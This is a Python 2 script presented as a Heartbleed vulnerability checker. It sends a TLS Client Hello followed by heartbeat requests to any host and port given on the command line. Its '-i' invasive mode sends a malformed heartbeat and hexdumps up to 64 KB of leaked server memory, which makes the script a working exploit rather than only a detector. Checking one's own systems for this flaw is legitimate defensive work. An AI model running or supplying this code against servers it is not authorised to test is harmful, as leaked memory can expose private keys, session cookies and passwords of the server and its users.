#!/usr/bin/python
'''
This is a HeartBleed checker python script.
It has been created by Efthimios Iosifidis
based on the 
https://github.com/musalbas/heartbleed-masstest
https://gist.github.com/sh1n0b1/10100394
'''

import socket
import sys 
import time
import select
import struct
from optparse import OptionParser


def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

#TLSv1.2 Client Hello Message 
hello = h2bin('''
16 03 03 00  dc 01 00 00 d8 03 03 56
54 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

#TLSv1.2 heartbeat message malformed
hb = h2bin(''' 
18 03 03 00 03
01 40 00
''')

#TLSv1.2 heartbeat message for non-invasive mode
hb2  = h2bin("18 03 03") + h2bin("40 00 01 3f fd") + "\x01"*16381
hb2 += h2bin("18 03 03") + h2bin("00 03 01 00 00")



def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        print '  %04x: %-48s %s' % (b, hxdat, pdat)
    print
    
    

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time() 
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata


def recvmsg(s):
    hdr = recvall(s, 5)
    
    mtypes = {22:"Handshake",24:"HeartBeat"}
    if hdr is None:
        print 'Unexpected EOF receiving record header - server closed connection'
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        print 'Unexpected EOF receiving record payload - server closed connection'
        return None, None, None
    print ' .. received message: type = %d (%s), ver = %04x, length = %d' % (typ, mtypes[typ], ver, len(pay))
    return typ, ver, pay


def hb_test(s,i_flag):
    
    #check  the i_flag in order to send the hearbeat request in invasive mode
    if i_flag == True: 
        print
        print '[+] Sending heartbeat request Invasive Mode...' 
        s.send(hb)
    else:
        print
        print "[+] Sending Heartbeat request Non Invasive Mode"
        s.send(hb2)
        
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print 'No heartbeat response received, server likely not vulnerable'
            return False

        if typ == 24:
            
            if i_flag == True:
                print 'Received heartbeat response:'
                hexdump(pay)               
            if len(pay) > 3:
                print '[+] Server returned more data than it should - Server is vulnerable!'
            else:
                print 'Server processed malformed heartbeat, but did not return any extra data.'
            return True

        if typ == 21:
            print 'Received alert:'
            hexdump(pay)
            print 'Server returned error, likely not vulnerable'
            return False



def main(): 
    
    # Parse scan parameters
    parser = OptionParser(usage='%prog host [options]', description='A Simple Checker for the SSL heartbleed vulnerability') 
    parser.add_option("-i", action="store_true", dest="i_flag", help="Invasive mode. It dumps 64kbytes of server memory.")   
    parser.add_option("--port", dest="port", help="port", default = 443, type="int", metavar="443")
   
   
   
    (options, arguments) = parser.parse_args()
   

    # Perform checks on user input
    #check the length of the arguments list
    if len(arguments) < 1:
        parser.print_help()
        exit(1)
   
   #retrieve the first argument which is the IP address      
    host = arguments[0]
    
    port = options.port
    
    #set the invasive flag to True or False
    if options.i_flag: 
        i_flag = True
    else: 
        i_flag = False
    
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
    try:   
        print '[+] Connecting to %s...'%host
        s.connect((host, port))		
      
    except socket.error, msg:
        print "[!] Could not connect to target host: %s" % msg
        s.close()
        sys.exit(1)
        

    print '[+] Sending Client Hello...'
    sys.stdout.flush()
    s.send(hello)
    
    
    
    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            print '[!] Server closed connection without sending Server Hello.'
            return
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            break    
     
    #Send the Heartbeat Request & Process response     
    hb_test(s,i_flag)



    
if __name__ == '__main__':
    main()   
